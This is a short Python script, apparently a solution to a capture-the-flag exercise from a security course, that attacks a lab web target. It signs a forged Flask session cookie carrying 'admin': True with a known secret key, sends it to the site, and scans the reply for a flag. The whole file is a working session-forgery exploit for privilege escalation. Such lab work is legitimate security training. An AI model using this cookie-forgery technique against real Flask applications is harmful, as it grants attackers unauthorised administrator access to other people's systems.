import requests
import re
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

TARGET_URL = "https://keyboard.quoccacorp.com"
SECRET_KEY = "$hallICompareTHEE2aSummersday"
PAYLOAD = {"admin": True, "secret_key": SECRET_KEY}

FLAG_PATTERN = r"(COMP6443{.+?})"
def find_flag(text: str, flag_pattern = FLAG_PATTERN):
    if flag_match := re.search(flag_pattern, text):
        flag = flag_match.group(1)
        print(f"\n🚩 FLAG FOUND 🚩\n{flag}" * 10)
        exit()

app = Flask(__name__)
app.secret_key = SECRET_KEY

serializer = SecureCookieSessionInterface().get_signing_serializer(app)
signed_flask_token = serializer.dumps(PAYLOAD)

session = requests.Session()
session.cert = "../../z5437741.pem"
session.cookies.set("session", signed_flask_token)

response = session.get(TARGET_URL)
find_flag(response.text)